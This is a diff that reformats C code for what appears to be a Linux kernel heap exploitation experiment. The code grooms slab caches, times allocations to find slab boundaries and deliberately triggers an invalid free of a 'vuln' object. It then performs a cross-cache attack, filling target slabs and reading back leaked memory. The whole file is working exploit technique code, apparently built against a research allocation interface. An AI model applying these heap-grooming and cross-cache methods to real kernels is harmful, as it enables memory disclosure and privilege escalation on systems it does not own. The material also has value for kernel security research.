@@ -6,25 +6,30 @@
  */
 
 void *vuln_keap;
-#define ALLOC_VULN() do { vuln_keap = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT); } while (0)
-#define FREE_VULN() do { int ret = keap_free(vuln_keap); if (ret) lerror("free vuln error"); } while (0)
+#define ALLOC_VULN()                                                           \
+  do {                                                                         \
+    vuln_keap = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT);                    \
+  } while (0)
+#define FREE_VULN()                                                            \
+  do {                                                                         \
+    int ret = keap_free(vuln_keap);                                            \
+    if (ret)                                                                   \
+      lerror("free vuln error");                                               \
+  } while (0)
 
-
-void** objs;
+void **objs;
 void alloc_obj(size_t i) {
   objs[i] = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT);
 }
 
-void free_obj(size_t i) {
-  keap_free(objs[i]);
-}
+void free_obj(size_t i) { keap_free(objs[i]); }
 
 static size_t *start_indexes;
 
 // make sure we create new slabs (fill all freed objs)
 void alloc_objs(void) {
   linfo("allocate %ld objs", cur->allocs);
-  for (size_t i = cur->allocs; i < cur->allocs*2; ++i)
+  for (size_t i = cur->allocs; i < cur->allocs * 2; ++i)
     alloc_obj(i);
 }
 
@@ -51,7 +56,8 @@ void timed_alloc_objs(void) {
 
   linfo("allocate %ld objs", cur->allocs);
   for (size_t i = 0; i < cur->allocs; ++i) {
-    if (running == cur->reclaimed_page_table && i - start == (cur->objs_per_slab - 3)) {
+    if (running == cur->reclaimed_page_table &&
+        i - start == (cur->objs_per_slab - 3)) {
       /* failed -> need to be restarted */
       if (state == ALLOC_CONTD)
         break;
@@ -65,7 +71,7 @@ void timed_alloc_objs(void) {
 
     prev_time = time;
     time = t1 - t0;
-    if (i > cur->allocs/16) {
+    if (i > cur->allocs / 16) {
       derived_time = time - prev_time;
       // linfo("derived time %ld", derived_time);
       if (start == -1) {
@@ -87,7 +93,8 @@ void timed_alloc_objs(void) {
       }
     }
 
-    if (running == cur->reclaimed_page_table && i - start == (cur->objs_per_slab - 3)) {
+    if (running == cur->reclaimed_page_table &&
+        i - start == (cur->objs_per_slab - 3)) {
       state = INVALID_FREE;
       FREE_VULN();
     }
@@ -100,13 +107,14 @@ void timed_alloc_objs(void) {
 
 #define TARGET_SIZE 0x100
 #define TARGET_CHUNKS 0x800
-void* target_objs[TARGET_CHUNKS];
+void *target_objs[TARGET_CHUNKS];
 void free_objs_and_alloc_mmap(void) {
   char *buf = cyclic(TARGET_SIZE);
   char *clear[cur->size];
   bzero(clear, sizeof(clear));
 
-  linfo("empty caches and free objs slab per chunk %ld obj per slab %ld", cur->slab_per_chunk, cur->objs_per_slab);
+  linfo("empty caches and free objs slab per chunk %ld obj per slab %ld",
+        cur->slab_per_chunk, cur->objs_per_slab);
   keap_write(objs[start_indexes[0] - 3], clear, cur->size);
   free_obj(start_indexes[0] - 3);
   keap_write(objs[start_indexes[0] - 2], clear, cur->size);
@@ -121,12 +129,11 @@ void free_objs_and_alloc_mmap(void) {
   }
 
   linfo("fill target slabs");
-  for(int i = 0; i < TARGET_CHUNKS; ++i) {
+  for (int i = 0; i < TARGET_CHUNKS; ++i) {
     target_objs[i] = keap_malloc(TARGET_SIZE, GFP_KERNEL);
     keap_write(target_objs[i], buf, TARGET_SIZE);
   }
   free(buf);
-
 }
 
 // used slab aligned objs to trigger cross cache
@@ -138,11 +145,13 @@ size_t get_leaks() {
     for (ssize_t j = 0; j < (ssize_t)cur->objs_per_slab; ++j) {
       bzero(leak, sizeof(leak));
       keap_read(objs[start_indexes[i] + j], leak, cur->size);
-      if(strcmp(leak, "") != 0) ++leaks;
+      if (strcmp(leak, "") != 0)
+        ++leaks;
     }
   }
 
-  linfo("got %ld/%ld successfull leaks", leaks, cur->slab_per_chunk * cur->objs_per_slab);
+  linfo("got %ld/%ld successfull leaks", leaks,
+        cur->slab_per_chunk * cur->objs_per_slab);
   keap_read(vuln_keap, leak, cur->size);
   linfo("targeted leak: %.8s", leak);
 
@@ -165,7 +174,7 @@ int main(int argc, char *argv[]) {
   set_current_slab_info(slab_size);
   rlimit_increase(RLIMIT_NOFILE);
   start_indexes = calloc(cur->slab_per_chunk, sizeof(size_t));
-  objs = calloc(cur->allocs*2, sizeof(void*));
+  objs = calloc(cur->allocs * 2, sizeof(void *));
 
   lstage("alloc");
   alloc_objs();
@@ -181,5 +190,4 @@ int main(int argc, char *argv[]) {
   free(objs);
 
   return leaks > 0 ? EXIT_SUCCESS : EXIT_FAILURE;
-
 }
